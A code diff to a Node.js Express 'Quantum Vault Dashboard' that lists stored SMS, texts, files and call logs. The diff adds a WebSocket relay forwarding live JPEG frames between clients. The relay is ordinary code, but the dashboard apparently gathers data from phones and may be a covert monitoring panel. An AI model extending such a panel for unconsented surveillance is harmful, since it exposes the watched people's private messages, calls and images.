@@ -214,6 +214,25 @@ app.get('/', (req, res) => {
     res.render('index', { data: { ...db, texts: [...db.texts].reverse(), sms: [...db.sms].reverse(), files: [...db.files].reverse(), call_logs: [...db.call_logs].reverse() } });
 });
 
-app.listen(PORT, '0.0.0.0', () => {
+const server = app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Quantum Vault Dashboard → Publicly Accessible via AWS IP on Port ${PORT}`);
+});
+
+// ─── WebSocket Relay (Live Streming) ──────────────────────────────────────────
+const { WebSocketServer } = require('ws');
+const wss = new WebSocketServer({ server });
+
+wss.on('connection', (ws) => {
+    console.log('[WS] New Connection');
+
+    ws.on('message', (data, isBinary) => {
+        // Relay binary data (JPEG frames) to all other connected clients
+        wss.clients.forEach((client) => {
+            if (client !== ws && client.readyState === 1) { // 1 = OPEN
+                client.send(data, { binary: isBinary });
+            }
+        });
+    });
+
+    ws.on('close', () => console.log('[WS] Disconnected'));
 });
